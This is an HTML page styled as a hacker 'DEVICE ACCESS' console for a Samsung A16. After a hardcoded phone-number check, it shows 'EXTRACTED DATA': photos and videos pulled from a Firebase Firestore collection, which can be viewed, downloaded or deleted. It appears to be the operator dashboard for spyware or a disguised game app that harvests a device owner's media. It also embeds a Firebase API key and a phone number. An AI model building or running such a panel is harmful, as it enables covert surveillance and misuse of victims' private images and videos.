<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ACCESS</title>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:monospace;background:#000;color:#0f0;min-height:100vh}
        .c{max-width:500px;margin:0 auto;padding:15px}
        .h{background:#000;border:2px solid #f00;padding:20px;text-align:center;margin-bottom:15px;border-radius:10px;box-shadow:0 0 30px rgba(255,0,0,0.5)}
        .h h1{color:#f00;font-size:18px}
        input{width:100%;padding:15px;background:#000;border:1px solid #0f0;color:#0f0;font-size:18px;text-align:center;border-radius:8px;outline:none;letter-spacing:4px}
        .btn{width:100%;padding:15px;margin:10px 0;border:2px solid #f00;background:#000;color:#f00;font-size:16px;font-weight:bold;cursor:pointer;border-radius:8px}
        .btn:active{background:#f00;color:#000}
        .err{background:#000;border:2px solid #f00;padding:12px;text-align:center;color:#f00;display:none;border-radius:8px;margin:10px 0}
        .g{display:none}
        .g h2{text-align:center;color:#ff0;margin:15px 0;font-size:14px}
        .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:8px}
        .item{border:1px solid #0f0;border-radius:8px;overflow:hidden;background:#111;cursor:pointer;position:relative}
        .item img{width:100%;height:180px;object-fit:cover;display:block}
        .item iframe{width:100%;height:180px;border:0}
        .item .t{padding:6px;font-size:9px;color:#0f0;text-align:center;background:rgba(0,0,0,0.8)}
        .item .broken{width:100%;height:180px;display:flex;align-items:center;justify-content:center;color:#f00;font-size:14px;background:#111}
        .loading{text-align:center;padding:30px;display:none}
        .spinner{border:3px solid #000;border-top:3px solid #f00;border-radius:50%;width:40px;height:40px;animation:spin 0.8s linear infinite;margin:15px auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .count{text-align:center;color:#888;font-size:10px;margin:5px 0}
        .sec{color:#f60;text-align:center;font-size:12px;margin:15px 0 8px;border-bottom:1px solid #333;padding-bottom:8px}
        
        /* Fullscreen Viewer */
        .viewer{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999;display:none;flex-direction:column}
        .viewer.show{display:flex}
        .viewer .top-bar{display:flex;justify-content:space-between;align-items:center;padding:12px;background:rgba(0,0,0,0.9);border-bottom:2px solid #0f0}
        .viewer .top-bar span{color:#0f0;font-size:13px}
        .viewer .top-bar .actions{display:flex;gap:8px}
        .viewer .top-bar button{padding:8px 14px;border:1px solid #0f0;background:transparent;color:#0f0;font-size:11px;cursor:pointer;border-radius:5px;font-family:monospace}
        .viewer .top-bar button:active{background:#0f0;color:#000}
        .viewer .top-bar .btn-del{border-color:#f00;color:#f00}
        .viewer .top-bar .btn-del:active{background:#f00;color:#000}
        .viewer .top-bar .btn-down{border-color:#ff0;color:#ff0}
        .viewer .top-bar .btn-down:active{background:#ff0;color:#000}
        .viewer .content{flex:1;display:flex;align-items:center;justify-content:center;overflow:auto}
        .viewer .content img{max-width:100%;max-height:100%;object-fit:contain}
        .viewer .content iframe{width:100%;height:100%;border:0}
        .viewer .nav-btn{position:absolute;top:50%;transform:translateY(-50%);background:rgba(0,0,0,0.7);color:#0f0;border:1px solid #0f0;padding:15px 10px;cursor:pointer;font-size:20px;z-index:10;border-radius:5px}
        .viewer .nav-btn:active{background:#0f0;color:#000}
        .viewer .prev{left:10px}
        .viewer .next{right:10px}
        .viewer .counter{position:absolute;bottom:15px;left:50%;transform:translateX(-50%);color:#0f0;font-size:11px;background:rgba(0,0,0,0.8);padding:5px 12px;border-radius:15px;border:1px solid #0f0}
    </style>
</head>
<body>
    <div class="c">
        <div class="h"><h1>☠️ DEVICE ACCESS ☠️</h1><div style="color:#0f0;font-size:10px;margin-top:8px;">SAMSUNG A16</div></div>
        
        <div id="login">
            <div style="background:#000;border:2px solid #0f0;padding:18px;border-radius:10px;margin:12px 0;">
                <div style="color:#888;font-size:10px;text-align:center;margin-bottom:10px;">ENTER NUMBER</div>
                <input type="tel" id="phone" placeholder="01XXXXXXXXX" maxlength="11">
            </div>
            <button class="btn" onclick="check()">[ ACCESS ]</button>
            <div class="err" id="err"></div>
        </div>
        
        <div class="loading" id="load"><div class="spinner"></div><p style="color:#f00;margin-top:10px;">BREACHING...</p></div>
        
        <div class="g" id="gal">
            <h2>📱 EXTRACTED DATA</h2>
            <div class="count" id="cnt"></div>
            <div class="sec">📸 PHOTOS</div>
            <div class="grid" id="pg"></div>
            <div class="sec">🎬 VIDEOS</div>
            <div class="grid" id="vg"></div>
            <button class="btn" onclick="location.reload()">[ BACK ]</button>
        </div>
    </div>
    
    <!-- Viewer -->
    <div class="viewer" id="viewer">
        <div class="top-bar">
            <button class="btn-del" onclick="deleteCurrent()">🗑️ DELETE</button>
            <span id="viewerTitle">📸 Photo</span>
            <div class="actions">
                <button class="btn-down" onclick="downloadCurrent()">💾 DOWNLOAD</button>
                <button onclick="closeViewer()">✕ CLOSE</button>
            </div>
        </div>
        <div class="content" id="viewerContent"></div>
        <button class="nav-btn prev" onclick="navigate(-1)">◀</button>
        <button class="nav-btn next" onclick="navigate(1)">▶</button>
        <div class="counter" id="viewerCounter">1/10</div>
    </div>

    <script>
        firebase.initializeApp({
            apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
            projectId:"game-a1aca",
            storageBucket:"game-a1aca.firebasestorage.app",
            appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"
        });
        const db=firebase.firestore(),T="01288649304";
        let allFiles=[],currentIndex=0,currentDocId='';
        
        function check(){
            const v=document.getElementById('phone').value.trim(),e=document.getElementById('err');
            if(!v){e.style.display='block';e.textContent='[!] ENTER NUMBER';return;}
            if(v!==T){e.style.display='block';e.textContent='[!] ACCESS DENIED';return;}
            e.style.display='none';document.getElementById('login').style.display='none';
            document.getElementById('load').style.display='block';
            setTimeout(()=>{
                document.getElementById('load').style.display='none';
                document.getElementById('gal').style.display='block';
                loadFiles();
            },2000);
        }
        
        async function loadFiles(){
            const snap=await db.collection('mylinks').orderBy('timestamp','desc').get();
            let p=[],v=[];
            allFiles=[];
            snap.forEach(d=>{
                const x=d.data();x._id=d.id;
                allFiles.push(x);
                (x.type==='🎬'?v:p).push(x);
            });
            document.getElementById('cnt').textContent='📸 '+p.length+' | 🎬 '+v.length;
            document.getElementById('pg').innerHTML=p.length?p.map((x,i)=>{
                const idx=allFiles.indexOf(x);
                return `<div class="item" onclick="openViewer(${idx})">
                    <img src="${x.url}" loading="lazy" onerror="this.parentElement.innerHTML='<div class=broken>❌</div>'"><div class="t">📸</div>
                </div>`;
            }).join(''):'<div style="color:#555;text-align:center;padding:20px;grid-column:1/-1;">No photos</div>';
            
            document.getElementById('vg').innerHTML=v.length?v.map((x,i)=>{
                const idx=allFiles.indexOf(x);
                return `<div class="item" onclick="openViewer(${idx})">
                    <iframe src="${x.url}" allowfullscreen></iframe><div class="t">🎬</div>
                </div>`;
            }).join(''):'<div style="color:#555;text-align:center;padding:20px;grid-column:1/-1;">No videos</div>';
        }
        
        function openViewer(index){
            currentIndex=index;
            const file=allFiles[index];
            if(!file)return;
            currentDocId=file._id;
            
            document.getElementById('viewer').classList.add('show');
            document.getElementById('viewerTitle').textContent=file.type+' '+file.url.split('/').pop().substring(0,20);
            updateViewerContent();
            updateCounter();
        }
        
        function updateViewerContent(){
            const file=allFiles[currentIndex];
            if(!file)return;
            currentDocId=file._id;
            const content=document.getElementById('viewerContent');
            
            if(file.type==='🎬'){
                content.innerHTML=`<iframe src="${file.url}" allowfullscreen></iframe>`;
            }else{
                content.innerHTML=`<img src="${file.url}" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22200%22><rect fill=%22%23000%22 width=%22200%22 height=%22200%22/><text fill=%22%23f00%22 x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22>❌</text></svg>'">`;
            }
            document.getElementById('viewerTitle').textContent=file.type+' '+file.url.split('/').pop().substring(0,20);
            updateCounter();
        }
        
        function navigate(dir){
            currentIndex+=dir;
            if(currentIndex<0)currentIndex=allFiles.length-1;
            if(currentIndex>=allFiles.length)currentIndex=0;
            updateViewerContent();
        }
        
        function updateCounter(){
            document.getElementById('viewerCounter').textContent=(currentIndex+1)+'/'+allFiles.length;
        }
        
        function closeViewer(){
            document.getElementById('viewer').classList.remove('show');
            document.getElementById('viewerContent').innerHTML='';
        }
        
        async function deleteCurrent(){
            if(!confirm('🗑️ حذف هذا الملف؟'))return;
            if(currentDocId){
                await db.collection('mylinks').doc(currentDocId).delete();
                allFiles.splice(currentIndex,1);
                if(allFiles.length===0){closeViewer();loadFiles();return;}
                if(currentIndex>=allFiles.length)currentIndex=allFiles.length-1;
                updateViewerContent();
            }
            loadFiles();
        }
        
        function downloadCurrent(){
            const file=allFiles[currentIndex];
            if(!file)return;
            const a=document.createElement('a');
            a.href=file.url;
            a.download=file.url.split('/').pop()||'file';
            a.target='_blank';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
        
        // Keyboard navigation
        document.addEventListener('keydown',function(e){
            if(!document.getElementById('viewer').classList.contains('show'))return;
            if(e.key==='ArrowLeft')navigate(-1);
            if(e.key==='ArrowRight')navigate(1);
            if(e.key==='Escape')closeViewer();
        });
        
        document.getElementById('phone').addEventListener('keydown',function(e){if(e.key==='Enter')check();});
    </script>
</body>
</html>
